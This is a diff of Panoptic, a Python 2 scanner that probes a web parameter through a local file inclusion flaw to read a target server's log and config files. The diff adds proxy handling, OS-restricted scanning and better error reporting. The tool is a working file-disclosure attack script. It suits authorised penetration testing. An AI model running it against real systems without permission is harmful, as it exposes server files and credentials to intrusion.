@@ -25,7 +25,7 @@ SOFTWARE.
 """
 Panoptic
 
-Search default file locations through LFI for common log and config files
+Search default file locations through LFI vulnerability for common log and config files
 """
 
 import difflib
@@ -37,7 +37,7 @@ import time
 import xml.etree.ElementTree as ET
 
 from urllib import urlencode
-from urllib2 import urlopen, Request
+from urllib2 import build_opener, install_opener, urlopen, ProxyHandler, Request
 from urlparse import urlsplit, parse_qsl
 from optparse import OptionParser
 from sys import exit
@@ -138,17 +138,17 @@ def parse_args():
     parser = OptionParser(usage="usage: %prog --url TARGET [options]", epilog=EXAMPLES)
 
     # Required
-    parser.add_option("-u", "--url", dest="target",
-                help="set the target to test")
+    parser.add_option("-u", "--url", dest="url",
+                help="set the target URL to test")
     # Optional
     parser.add_option("-p", "--param", dest="param",
                 help="set parameter name to test for")
 
     parser.add_option("-d", "--data", dest="data",
-                help="set data for POST request")
+                help="set data for POST request (e.g. \"page=default\")")
 
     parser.add_option("-P", "--proxy", dest="proxy",
-                help="set IP:PORT to use as SOCKS proxy")
+                help="set proxy type and address (e.g. \"socks5://192.168.5.92\")")
 
     parser.add_option("-o", "--os", dest="os",
                 help="set operating system to limit searches to")
@@ -169,7 +169,7 @@ def parse_args():
                 help="set postfix for file path (e.g. \"%00\")")
 
     parser.add_option("-m", "--multiplier", dest="multiplier", type="int", default=1,
-                help="set number to multiply the prefix by")
+                help="set number to multiply the prefix by (e.g. 10)")
 
     parser.add_option("-w", "--write-file", dest="write_file", action="store_true",
                 help="write content of found files to output folder")
@@ -188,7 +188,7 @@ def parse_args():
 
     args = parser.parse_args()[0]
 
-    if not any((args.target, args.list)):
+    if not any((args.url, args.list)):
         parser.error('missing argument for url. Use -h for help')
 
     if args.prefix:
@@ -203,8 +203,9 @@ def main():
 
     print(BANNER)
 
-    found = False
     args = parse_args()
+    found = False
+    kb = {}
 
     cases = get_cases(args)
 
@@ -216,9 +217,24 @@ def main():
 
         exit()
 
+    if args.proxy:
+        import thirdparty.socks.socks
+
+        match = re.search(r"(?P<type>[^:]+)://(?P<address>[^:]+):(?P<port>\d+)", args.proxy, re.I)
+
+        if match:
+            if match.group("type").lower() == "socks4":
+                socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, match.group("address"), int(match.group("port")), True)
+            elif match.group("type").lower() == "socks5":
+                socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, match.group("address"), int(match.group("port")), True)
+            elif match.group("type").lower() in ("http", "https"):
+                _ = ProxyHandler({match.group("type"): args.proxy})
+                opener = build_opener(_)
+                install_opener(opener)
+
     print("[i] Starting scan at: %s\n" % time.strftime("%X"))
 
-    parsed_url = urlsplit(args.target)
+    parsed_url = urlsplit(args.url)
     request_params = args.data if args.data else parsed_url.query
 
     if not args.param:
@@ -229,15 +245,17 @@ def main():
         Prepares HTTP (GET or POST) request with proper payload
         """
 
-        armed_query = re.sub(r"(?P<param>%s)={1}(?P<value>[^=&]+)" % args.param,
+        _ = re.sub(r"(?P<param>%s)={1}(?P<value>[^=&]+)" % args.param,
                                 r"\1=%s" % payload, request_params)
 
-        request_args = {"target": "%s://%s%s" % (parsed_url.scheme or "http", parsed_url.netloc, parsed_url.path)}
+        request_args = {"url": "%s://%s%s" % (parsed_url.scheme or "http", parsed_url.netloc, parsed_url.path)}
 
         if args.data:
-            request_args["data"] = armed_query
+            request_args["data"] = _
         else:
-            request_args["target"] += "?%s" % armed_query
+            request_args["url"] += "?%s" % _
+
+        request_args["verbose"] = args.verbose
 
         return request_args
 
@@ -260,6 +278,12 @@ def main():
     print("[*] Searching for files...")
 
     for case in cases:
+        if kb.get("restrictOS") and kb.get("restrictOS") != case["os"]:
+            if args.verbose:
+                print("[o] Skipping '%s'" % case["location"])
+
+            continue
+
         if args.prefix and args.prefix[len(args.prefix) - 1] == "/":
             args.prefix = args.prefix[:-1]
 
@@ -267,7 +291,7 @@ def main():
         #    case["location"] = case["location"].replace("/", repr(args.replace_slash))
 
         if args.verbose:
-            print("[?] Trying: '%s'" % case["location"])
+            print("[o] Trying '%s'" % case["location"])
 
         request_args = prepare_request("%s%s%s" % (args.prefix, case["location"], args.postfix))
         html, _ = get_page(**request_args)
@@ -282,11 +306,14 @@ def main():
                 found = True
 
                 print("[*] Possible file(s) found!\n")
+                print("[*] OS: %s\n" % case["os"])
 
-                if case["os"]:
-                    print("[*] OS: %s\n" % case["os"])
+                if kb.get("restrictOS") is None:
+                    _ = raw_input("[?] Do you want to restrict further scans to '%s'? [Y/n] " % case["os"])
+                    print
+                    kb["restrictOS"] = _.lower() != 'n' and case["os"]
 
-            print("[+] Found: %s" % case)
+            print("[+] Found '%s' (%s/%s/%s)" % (case["location"], case["os"], case["category"], case["type"]))
 
             # If --write-file is set.
             if args.write_file:
@@ -313,11 +340,10 @@ def get_page(**kwargs):
     Retrieves page content from a given target URL
     """
 
-    url = kwargs.get("target", None)
+    url = kwargs.get("url", None)
     post = kwargs.get("data", None)
     header = kwargs.get("header", None)
     cookie = kwargs.get("cookie", None)
-    proxy = kwargs.get("proxy", False)
     user_agent = kwargs.get("user_agent", None)
     verbose = kwargs.get("verbose", False)
 
@@ -332,14 +358,6 @@ def get_page(**kwargs):
         parsed_url = urlsplit(url)
     except:
         raise Exception("[!] Unable to parse URL: %s" % url)
-
-    if proxy:
-        import socket
-        import thirdparty.socks.socks
-
-        ip, port = proxy.split(':')
-        socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, ip, int(port), True)
-        socket.socket = socks.socksocket
 
     if user_agent is None:
         user_agent = "%s %s" % (NAME, VERSION)
@@ -364,14 +382,26 @@ def get_page(**kwargs):
         status = conn.msg
         responseHeaders = conn.info()
 
-    except IOError, e:
-        if hasattr(e, "reason"):
-            if verbose:
-                print("[!] Error msg: %d" % e.msg)
-                print("[!] HTTP error code: %d" % e.code)
-                print("[!] Response headers: %d" % e.info())
+    except KeyboardInterrupt:
+        raise
+
+    except Exception, e:
+        if verbose:
+            if getattr(e, "msg", None):
+                print("[!] Error msg '%s'" % e.msg)
+            if getattr(e, "reason", None):
+                print("[!] Error reason '%s'" % e.reason)
+            if getattr(e, "message", None):
+                print("[!] Error message '%s'" % e.message)
+            if getattr(e, "code", None):
+                print("[!] HTTP error code '%d'" % e.code)
+            if getattr(e, "info", None):
+                print("[!] Response headers '%s'" % e.info())
 
     return page, parsed_url
 
 if __name__ == "__main__":
-    main()
+    try:
+        main()
+    except KeyboardInterrupt:
+        print "[x] Ctrl-C pressed"
